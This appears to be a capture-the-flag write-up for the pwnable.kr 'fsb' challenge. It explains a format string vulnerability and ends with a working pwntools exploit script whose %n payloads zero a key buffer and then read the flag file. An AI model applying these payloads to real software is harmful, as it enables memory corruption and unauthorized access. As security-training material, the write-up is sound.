# Rookiss - fsb

> Isn't FSB almost obsolete in computer security?
>
> Anyway, have fun with it :)

I started by exploring the [disassembled code](https://imgur.com/a/gO98NMu) using IDA. The code contains a vulnerable call to `printf`. OWASP has a nice overview [page](https://owasp.org/www-community/attacks/Format_string_attack) about string format vulnerabilities. I can submit 4 strings to make my exploit.

After the `printf`-calls, the program compares a `key` input to a random number stored in `buf`. The address of `buf` is `0x0804A060` (= decimal 134520928), which was easy to figure out [using IDA](https://i.imgur.com/gatDor7.png) too. It's 8 bytes long. Then using GDB, I figured out there is a pointer to `pargv` at offset `0x14` from the string. I'll try to make both `0x0804A060` and `0x0804A064` equal to zero, to make the key equal to zero. Luckily, we can submit four strings, so I think I can:

1. Make that `pargv` pointer equal to `0x0804A060`.
2. Use `%n` to make whatever the 14th pointer points at equal to zero.
3. Make that `pargv` pointer equal to `0x0804A064`.
4. Use `%n` to make whatever the 14th pointer points at equal to zero.

Putting this all together, I wrote the following code with the help of pwntools. It works when executed on the pwnable machine.

```py
from pwn import *
conn = process("/home/fsb/fsb")

conn.recvuntil("strings(1)\n")
conn.sendline("%134520928x%14$n")

conn.recvuntil("strings(2)\n")
conn.sendline("%20$n")

conn.recvuntil("strings(3)\n")
conn.sendline("%134520932x%14$n")

conn.recvuntil("strings(4)\n")
conn.sendline("%20$n")

conn.recvuntil("key :")
conn.sendline("0")

conn.recvuntil("Congratz!")
conn.sendline("cat /home/fsb/flag")

print("Received flag:")
print(conn.recvline())
print(conn.recvline())
conn.close()
```

Do note there's a timer in the program, which makes the exploit take a few seconds. Don't exit the program immediately if you think it's blocking :)

